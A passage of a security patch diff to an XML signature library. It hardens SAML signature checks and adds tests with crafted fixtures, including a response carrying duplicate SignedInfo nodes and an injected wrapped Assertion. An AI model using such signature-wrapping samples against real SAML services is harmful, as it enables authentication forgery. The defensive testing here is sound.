this.findSignatureAlgorithm(this.signatureAlgorithm);\n     const key = this.getCertFromKeyInfo(this.keyInfo) || this.publicCert || this.privateKey;\n     if (key == null) {\n       throw new Error(\"KeyInfo or publicCert or privateKey is required to validate signature\");\n     }\n+\n     if (callback) {\n-      signer.verifySignature(signedInfoCanon, key, this.signatureValue, callback);\n+      signer.verifySignature(unverifiedSignedInfoCanon, key, this.signatureValue, callback);\n     } else {\n-      const verified = signer.verifySignature(signedInfoCanon, key, this.signatureValue);\n+      const verified = signer.verifySignature(unverifiedSignedInfoCanon, key, this.signatureValue);\n \n       if (verified === false) {\n         throw new Error(\n\n@@ -295,6 +341,11 @@\nexport class SignedXml {\n     if (signedInfo.length === 0) {\n       throw new Error(\"could not find SignedInfo element in the message\");\n     }\n+    if (signedInfo.length > 1) {\n+      throw new Error(\n+        \"could not get canonicalized signed info for a signature that contains multiple SignedInfo nodes\",\n+      );\n+    }\n \n     if (\n       this.canonicalizationAlgorithm === \"http://www.w3.org/TR/2001/REC-xml-c14n-20010315\" ||\n\n@@ -522,11 +573,43 @@\nexport class SignedXml {\n       this.signatureAlgorithm = signatureAlgorithm.value as SignatureAlgorithmType;\n     }\n \n-    this.references = [];\n-    const references = xpath.select(\n-      \".//*[local-name(.)='SignedInfo']/*[local-name(.)='Reference']\",\n-      signatureNode,\n+    const signedInfoNodes = utils.findChildren(this.signatureNode, \"SignedInfo\");\n+    if (!utils.isArrayHasLength(signedInfoNodes)) {\n+      throw new Error(\"no signed info node found\");\n+    }\n+    if (signedInfoNodes.length > 1) {\n+      throw new Error(\"could not load signature that contains multiple SignedInfo nodes\");\n+    }\n+\n+    // Try to operate on the c14n version of `signedInfo`. This forces the initial `getReferences()`\n+    // API call to always return references that are loaded under the canonical `SignedInfo`\n+    // in the case that the client access the `.references` **before** signature verification.\n+\n+    // Ensure canonicalization algorithm is exclusive, otherwise we'd need the entire document\n+    let canonicalizationAlgorithmForSignedInfo = this.canonicalizationAlgorithm;\n+    if (\n+      !canonicalizationAlgorithmForSignedInfo ||\n+      canonicalizationAlgorithmForSignedInfo ===\n+        \"http://www.w3.org/TR/2001/REC-xml-c14n-20010315\" ||\n+      canonicalizationAlgorithmForSignedInfo ===\n+        \"http://www.w3.org/TR/2001/REC-xml-c14n-20010315#WithComments\"\n+    ) {\n+      canonicalizationAlgorithmForSignedInfo = \"http://www.w3.org/2001/10/xml-exc-c14n#\";\n+    }\n+\n+    const temporaryCanonSignedInfo = this.getCanonXml(\n+      [canonicalizationAlgorithmForSignedInfo],\n+      signedInfoNodes[0],\n+    );\n+    const temporaryCanonSignedInfoXml = new xmldom.DOMParser().parseFromString(\n+      temporaryCanonSignedInfo,\n+      \"text/xml\",\n     );\n+    const signedInfoDoc = temporaryCanonSignedInfoXml.documentElement;\n+\n+    this.references = [];\n+    const references = utils.findChildren(signedInfoDoc, \"Reference\");\n+\n     if (!utils.isArrayHasLength(references)) {\n       throw new Error(\"could not find any Reference elements\");\n     }\n\n@@ -572,11 +655,15 @@\nexport class SignedXml {\n     if (nodes.length === 0) {\n       throw new Error(`could not find DigestValue node in reference ${refNode.toString()}`);\n     }\n-    const firstChild = nodes[0].firstChild;\n-    if (!firstChild || !(\"data\" in firstChild)) {\n-      throw new Error(`could not find the value of DigestValue in ${nodes[0].toString()}`);\n+    if (nodes.length > 1) {\n+      throw new Error(\n+        `could not load reference for a node that contains multiple DigestValue nodes: ${refNode.toString()}`,\n+      );\n+    }\n+    const digestValue = nodes[0].textContent;\n+    if (!digestValue) {\n+      throw new Error(`could not find the value of DigestValue in ${refNode.toString()}`);\n     }\n-    const digestValue = firstChild.data;\n \n     const transforms: string[] = [];\n     let inclusiveNamespacesPrefixList: string[] = [];\n\n@@ -626,11 +713,14 @@\nexport class SignedXml {\n     ) {\n       transforms.push(\"http://www.w3.org/TR/2001/REC-xml-c14n-20010315\");\n     }\n+    const refUri = isDomNode.isElementNode(refNode)\n+      ? refNode.getAttribute(\"URI\") || undefined\n+      : undefined;\n \n     this.addReference({\n       transforms,\n       digestAlgorithm: digestAlgo,\n-      uri: isDomNode.isElementNode(refNode) ? utils.findAttr(refNode, \"URI\")?.value : undefined,\n+      uri: refUri,\n       digestValue,\n       inclusiveNamespacesPrefixList,\n       isEmptyUri: false,\n```\n\nFilename: test/saml-response-tests.spec.ts:\n```\n@@ -92,4 +92,78 @@\ndescribe(\"SAML response tests\", function () {\n     // This doesn't matter, just want to make sure that we don't fail due to unknown algorithm\n     expect(() => sig.checkSignature(xml)).to.throw(/^invalid signature/);\n   });\n+\n+  it(\"throws an error for a document with no `SignedInfo` node\", function () {\n+    const xml = fs.readFileSync(\"./test/static/invalid_saml_no_signed_info.xml\", \"utf-8\");\n+    const doc = new xmldom.DOMParser().parseFromString(xml);\n+    const node = xpath.select1(\n+      \"/*/*[local-name(.)='Signature' and namespace-uri(.)='http://www.w3.org/2000/09/xmldsig#']\",\n+      doc,\n+    );\n+\n+    isDomNode.assertIsNodeLike(node);\n+    const sig = new SignedXml();\n+    const feidePublicCert = fs.readFileSync(\"./test/static/feide_public.pem\");\n+    sig.publicCert = feidePublicCert;\n+\n+    expect(() => sig.loadSignature(node)).to.throw(\"no signed info node found\");\n+  });\n+\n+  it(\"test validation ignores an additional wrapped `SignedInfo` node\", function () {\n+    const xml = fs.readFileSync(\"./test/static/saml_wrapped_signed_info_node.xml\", \"utf-8\");\n+    const doc = new xmldom.DOMParser().parseFromString(xml);\n+    const assertion = xpath.select1(\"//*[local-name(.)='Assertion']\", doc);\n+    isDomNode.assertIsNodeLike(assertion);\n+    const signature = xpath.select1(\n+      \"//*[local-name(.)='Signature' and namespace-uri(.)='http://www.w3.org/2000/09/xmldsig#']\",\n+      assertion,\n+    );\n+    isDomNode.assertIsNodeLike(signature);\n+\n+    const sig = new SignedXml();\n+    sig.publicCert = fs.readFileSync(\"./test/static/saml_external_ns.pem\");\n+    sig.loadSignature(signature);\n+    expect(sig.getReferences().length).to.equal(1);\n+    const checkSignatureResult = sig.checkSignature(xml);\n+    expect(checkSignatureResult).to.be.true;\n+  });\n+\n+  it(\"test signature throws if multiple `SignedInfo` nodes are found\", function () {\n+    const xml = fs.readFileSync(\"./test/static/saml_multiple_signed_info_nodes.xml\", \"utf-8\");\n+    const doc = new xmldom.DOMParser().parseFromString(xml);\n+    const assertion = xpath.select1(\"//*[local-name(.)='Assertion'][1]\", doc);\n+    isDomNode.assertIsNodeLike(assertion);\n+    const signature = xpath.select1(\n+      \"//*[local-name(.)='Signature' and namespace-uri(.)='http://www.w3.org/2000/09/xmldsig#']\",\n+      assertion,\n+    );\n+    isDomNode.assertIsNodeLike(signature);\n+\n+    const sig = new SignedXml();\n+    sig.publicCert = fs.readFileSync(\"./test/static/saml_external_ns.pem\");\n+    expect(() => sig.loadSignature(signature)).to.throw(\n+      \"could not load signature that contains multiple SignedInfo nodes\",\n+    );\n+  });\n+\n+  describe(\"for a SAML response with a digest value comment\", () => {\n+    it(\"loads digest value from text content instead of comment\", function () {\n+      const xml = fs.readFileSync(\"./test/static/valid_saml_with_digest_comment.xml\", \"utf-8\");\n+      const doc = new xmldom.DOMParser().parseFromString(xml);\n+      const assertion = xpath.select1(\"//*[local-name(.)='Assertion']\", doc);\n+      isDomNode.assertIsNodeLike(assertion);\n+      const signature = xpath.select1(\n+        \"//*[local-name(.)='Signature' and namespace-uri(.)='http://www.w3.org/2000/09/xmldsig#']\",\n+        assertion,\n+      );\n+      isDomNode.assertIsNodeLike(signature);\n+      const sig = new SignedXml();\n+      sig.publicCert = fs.readFileSync(\"./test/static/feide_public.pem\");\n+\n+      sig.loadSignature(signature);\n+\n+      expect(sig.getReferences()[0].digestValue).to.equal(\"RnNjoyUguwze5w2R+cboyTHlkQk=\");\n+      expect(sig.checkSignature(xml)).to.be.false;\n+    });\n+  });\n });\n```\n\nFilename: test/static/invalid_saml_no_signed_info.xml:\n```\n@@ -0,0 +1,9 @@\n+<samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"pfx94e4a319-b6f7-4a40-25d1-01fcb642e4c5\" Version=\"2.0\" IssueInstant=\"2012-07-03T11:32:20Z\" Destination=\"http://localhost:3000/login/callback\" InResponseTo=\"_d766d16611ac0d14121b\"><saml:Issuer>https://openidp.feide.no</saml:Issuer><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n+  <ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>\n+    <ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/>\n+  <ds:SignatureValue>dkONrkxW+LSuDvnNMG/mWYFa47d2WGyapLhXSTYqrlT9Td+tT7ciojNJ55WTaPaCMt7IrGtIxxskPAZIjdIn5pRyDxHr0joWxzZ7oZHCOI1CnQV5HjOq+rzzmEN2LctCZ6S4hbL7SQ1qJ3vp2BCXAygy4tmJOURQdnk0KLwwRS8=</ds:SignatureValue>\n+<ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIICizCCAfQCCQCY8tKaMc0BMjANBgkqhkiG9w0BAQUFADCBiTELMAkGA1UEBhMCTk8xEjAQBgNVBAgTCVRyb25kaGVpbTEQMA4GA1UEChMHVU5JTkVUVDEOMAwGA1UECxMFRmVpZGUxGTAXBgNVBAMTEG9wZW5pZHAuZmVpZGUubm8xKTAnBgkqhkiG9w0BCQEWGmFuZHJlYXMuc29sYmVyZ0B1bmluZXR0Lm5vMB4XDTA4MDUwODA5MjI0OFoXDTM1MDkyMzA5MjI0OFowgYkxCzAJBgNVBAYTAk5PMRIwEAYDVQQIEwlUcm9uZGhlaW0xEDAOBgNVBAoTB1VOSU5FVFQxDjAMBgNVBAsTBUZlaWRlMRkwFwYDVQQDExBvcGVuaWRwLmZlaWRlLm5vMSkwJwYJKoZIhvcNAQkBFhphbmRyZWFzLnNvbGJlcmdAdW5pbmV0dC5ubzCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAt8jLoqI1VTlxAZ2axiDIThWcAOXdu8KkVUWaN/SooO9O0QQ7KRUjSGKN9JK65AFRDXQkWPAu4HlnO4noYlFSLnYyDxI66LCr71x4lgFJjqLeAvB/GqBqFfIZ3YK/NrhnUqFwZu63nLrZjcUZxNaPjOOSRSDaXpv1kb5k3jOiSGECAwEAATANBgkqhkiG9w0BAQUFAAOBgQBQYj4cAafWaYfjBU2zi1ElwStIaJ5nyp/s/8B8SAPK2T79McMyccP3wSW13LHkmM1jwKe3ACFXBvqGQN0IbcH49hu0FKhYFM/GPDJcIHFBsiyMBXChpye9vBaTNEBCtU3KjjyG0hRT2mAQ9h+bkPmOvlEo/aH0xR68Z9hw4PF13w==</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature><samlp:Status><samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp:Status><saml:Assertion xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" ID=\"pfx66496e6c-3c29-230d-6d47-b245434b872d\" Version=\"2.0\" IssueInstant=\"2012-07-03T11:32:20Z\"><saml:Issuer>https://openidp.feide.no</saml:Issuer><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n+  <ds:SignedInfo><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>\n+    <ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/>\n+  <ds:Reference URI=\"#pfx66496e6c-3c29-230d-6d47-b245434b872d\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/><ds:DigestValue>RnNjoyUguwze5w2R+cboyTHlkQk=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>aw5711jKP7xragunjRRCAD4mT4xKHc37iohBpQDbdSomD3ksOSB96UZQp0MtaC3xlVSkMtYw85Om96T2q2xrxLLYVA50eFJEMMF7SCVPStWTVjBlaCuOPEQxIaHyJs9Sy3MCEfbBh4Pqn9IJBd1kzwdlCrWWjAmksbFFg5wHQJA=</ds:SignatureValue>\n+<ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIICizCCAfQCCQCY8tKaMc0BMjANBgkqhkiG9w0BAQUFADCBiTELMAkGA1UEBhMCTk8xEjAQBgNVBAgTCVRyb25kaGVpbTEQMA4GA1UEChMHVU5JTkVUVDEOMAwGA1UECxMFRmVpZGUxGTAXBgNVBAMTEG9wZW5pZHAuZmVpZGUubm8xKTAnBgkqhkiG9w0BCQEWGmFuZHJlYXMuc29sYmVyZ0B1bmluZXR0Lm5vMB4XDTA4MDUwODA5MjI0OFoXDTM1MDkyMzA5MjI0OFowgYkxCzAJBgNVBAYTAk5PMRIwEAYDVQQIEwlUcm9uZGhlaW0xEDAOBgNVBAoTB1VOSU5FVFQxDjAMBgNVBAsTBUZlaWRlMRkwFwYDVQQDExBvcGVuaWRwLmZlaWRlLm5vMSkwJwYJKoZIhvcNAQkBFhphbmRyZWFzLnNvbGJlcmdAdW5pbmV0dC5ubzCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAt8jLoqI1VTlxAZ2axiDIThWcAOXdu8KkVUWaN/SooO9O0QQ7KRUjSGKN9JK65AFRDXQkWPAu4HlnO4noYlFSLnYyDxI66LCr71x4lgFJjqLeAvB/GqBqFfIZ3YK/NrhnUqFwZu63nLrZjcUZxNaPjOOSRSDaXpv1kb5k3jOiSGECAwEAATANBgkqhkiG9w0BAQUFAAOBgQBQYj4cAafWaYfjBU2zi1ElwStIaJ5nyp/s/8B8SAPK2T79McMyccP3wSW13LHkmM1jwKe3ACFXBvqGQN0IbcH49hu0FKhYFM/GPDJcIHFBsiyMBXChpye9vBaTNEBCtU3KjjyG0hRT2mAQ9h+bkPmOvlEo/aH0xR68Z9hw4PF13w==</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature><saml:Subject><saml:NameID SPNameQualifier=\"passport-saml\" Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:transient\">_6c5dcaa3053321ff4d63785fbc3f67c59a129cde82</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2012-07-03T11:37:20Z\" Recipient=\"http://localhost:3000/login/callback\" InResponseTo=\"_d766d16611ac0d14121b\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2012-07-03T11:31:50Z\" NotOnOrAfter=\"2012-07-03T11:37:20Z\"><saml:AudienceRestriction><saml:Audience>passport-saml</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant=\"2012-07-03T11:32:20Z\" SessionNotOnOrAfter=\"2012-07-03T19:32:20Z\" SessionIndex=\"_c8e6823fe38ddbce125f9be6e5118b8c352d04bcae\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name=\"uid\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">bergie</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"givenName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Henri</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"sn\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Bergius</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"cn\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Henri Bergius</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"mail\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">henri.bergius@nemein.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"eduPersonPrincipalName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">bergie@rnd.feide.no</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"eduPersonTargetedID\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">8216c78fe244502efa13f62e6615c94acb7bdf3e</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:0.9.2342.19200300.100.1.1\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">bergie</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:2.5.4.42\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Henri</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:2.5.4.4\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Bergius</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:2.5.4.3\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Henri Bergius</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:0.9.2342.19200300.100.1.3\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">henri.bergius@nemein.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:1.3.6.1.4.1.5923.1.1.1.6\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">bergie@rnd.feide.no</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"urn:oid:1.3.6.1.4.1.5923.1.1.1.10\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">8216c78fe244502efa13f62e6615c94acb7bdf3e</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion></samlp:Response>\n\\ No newline at end of file\n```\n\nFilename: test/static/saml_multiple_signed_info_nodes.xml:\n```\n@@ -0,0 +1 @@\n+<?xml version=\"1.0\"?><samlp:Response xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" ID=\"GOSAMLR13708454654483\" Version=\"2.0\" IssueInstant=\"2013-06-10T06:24:25Z\" Destination=\"ForNodeJS\"><saml:Issuer>https://app.onelogin.com/saml/metadata/164679</saml:Issuer><samlp:Status><samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp:Status><saml:Assertion xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" Version=\"2.0\" ID=\"OUR_CUSTOM_ID\" IssueInstant=\"2013-06-10T06:24:25Z\"><saml:Issuer>https://app.onelogin.com/saml/metadata/164679</saml:Issuer><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"><ds:SignedInfo><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/><ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/><ds:Reference URI=\"#pfx4790de7a-ba67-cdfe-122c-e557ad3b3743\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/><ds:DigestValue>Gx0mTydMn1k6804jZBrdUrZmbV4=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignedInfo><ds:Reference URI=\"#OUR_CUSTOM_ID\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/><ds:DigestValue>jGst6BnAC9xOeqa6hKNPsoMm2TY=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>oHEPKtwoCbfq1QRm2pjx35zVMqAsti4nQU+3ws8EUJUXHmPG2EoX3HBkb7D2wN4m+ZFrdwARUpNJlhhOIz/eG4jES6ar0tvlNN3qE5cqcQhwZHyRARLnTlERqyZU9Qm729DnAGBeXCdMb736zi16onOIVPNA63LRTzUIxhyZqypDCf1wd6me/ur6UUgH11nYOu4JDYx0iWNkXc1Nad7vkF9oMPeO1QsMxuZSIVH4tvdJkue+qAnu2l+dFJb0LPfm+xmIC0FBo+VX1ECCWRoUZIxjotQfAM6yZpHIi5fNqPXkVyN9fYoUEa9CafqHlc4tAAdgAgGeOqA3jWeC8ZnOVA==</ds:SignatureValue><ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIIEHjCCAwagAwIBAgIBATANBgkqhkiG9w0BAQUFADBnMQswCQYDVQQGEwJVUzETMBEGA1UECAwKQ2FsaWZvcm5pYTEVMBMGA1UEBwwMU2FudGEgTW9uaWNhMREwDwYDVQQKDAhPbmVMb2dpbjEZMBcGA1UEAwwQYXBwLm9uZWxvZ2luLmNvbTAeFw0xMzA1MjcwODU1MTNaFw0xODA1MjcwODU1MTNaMGcxCzAJBgNVBAYTAlVTMRMwEQYDVQQIDApDYWxpZm9ybmlhMRUwEwYDVQQHDAxTYW50YSBNb25pY2ExETAPBgNVBAoMCE9uZUxvZ2luMRkwFwYDVQQDDBBhcHAub25lbG9naW4uY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoXoc7IFZQRv+SwJ15zjIl9touwY5e6b7H4vn3OtOUByjOKHUX8VX0TpbAV2ctZE2GSALx1AGuQAv6O4MVUH+qn/2IAiBY3a7zKN07UBsya7xFMQVHuGE6EiBAs9jpA9wjvYMPRkS5wYZcwjpTQSZK7zFPPtobG8K/1vDbm/tWZjNLmZmQePmXpwrQAuC0+NlzlmnjoQYB2xp2NaTUK9JnnmuB5qev3dpUwlYGSJpf+HUIoxuo8IpxAXOymq1d6tEEJgU1kR2sa7o1sSRFo31YeW/qYCP/gcLJZo3MRUDFe0g5MHeliFue9DsKYUsC6qwAD3gc+MI47buiD6Msu11cwIDAQABo4HUMIHRMAwGA1UdEwEB/wQCMAAwHQYDVR0OBBYEFAAJFJRIlpQQSFsuNdeq7FkTJIH4MIGRBgNVHSMEgYkwgYaAFAAJFJRIlpQQSFsuNdeq7FkTJIH4oWukaTBnMQswCQYDVQQGEwJVUzETMBEGA1UECAwKQ2FsaWZvcm5pYTEVMBMGA1UEBwwMU2FudGEgTW9uaWNhMREwDwYDVQQKDAhPbmVMb2dpbjEZMBcGA1UEAwwQYXBwLm9uZWxvZ2luLmNvbYIBATAOBgNVHQ8BAf8EBAMCBPAwDQYJKoZIhvcNAQEFBQADggEBAB9zN+g6N4sUBE61RaMUH2LSHWwOtfhL64i7pjHjvZa47/qcV/S0Yyd4IE44ho9i2N+AM79d34mThc30oK5aVxOKphKf+xM/cOyVaWIeqr+dCbkY/0OpLEwWOh9VSgOizRO3evLMurbtR892LbSK/Td3hG5jfwoHD23nHH87Dv/3KyZox9MkJdY2DXOHGGIcsqoIifaTyNZyhW6RgwEujQ6LjsaolP1YoeV85TZFKTLa1Ta7ZLUVUC2UJWqz+kRlsyGxf+E/ZmJ7hSq0ZBVHrVOyXjCcFn6X0/W5SrpOmN3fZYcj8Bp6vhB0cJk9qpjgWOP2RCuBdHZVawjCjIaE+bc=</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature><saml:Subject><saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\">anyone@gmail.com</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2013-06-10T06:27:25Z\" Recipient=\"ForNodeJS\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2013-06-10T06:21:25Z\" NotOnOrAfter=\"2013-06-10T06:27:25Z\"><saml:AudienceRestriction><saml:Audience>ForNodeJS</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant=\"2013-06-10T06:24:24Z\" SessionNotOnOrAfter=\"2013-06-11T06:24:25Z\" SessionIndex=\"_5246a870-b3c4-0130-1bcd-782bcb56fcaa\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name=\"PersonImmutableID\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"User.email\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">kartik.cds@gmail.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"User.FirstName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">KartikCDS</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"User.Username\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"office\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"User.LastName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"memberOf\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute></saml:AttributeStatement></saml:Assertion><a><saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" Version=\"2.0\" ID=\"pfx4790de7a-ba67-cdfe-122c-e557ad3b3743\" IssueInstant=\"2013-06-10T06:24:25Z\"><saml:Issuer>https://app.onelogin.com/saml/metadata/164679</saml:Issuer><saml:Subject><saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\">kartik.cds@gmail.com</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2013-06-10T06:27:25Z\" Recipient=\"ForNodeJS\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2013-06-10T06:21:25Z\" NotOnOrAfter=\"2013-06-10T06:27:25Z\"><saml:AudienceRestriction><saml:Audience>ForNodeJS</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant=\"2013-06-10T06:24:24Z\" SessionNotOnOrAfter=\"2013-06-11T06:24:25Z\" SessionIndex=\"_5246a870-b3c4-0130-1bcd-782bcb56fcaa\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name=\"PersonImmutableID\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"User.email\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">kartik.cds@gmail.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"User.FirstName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">KartikCDS</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"User.Username\" 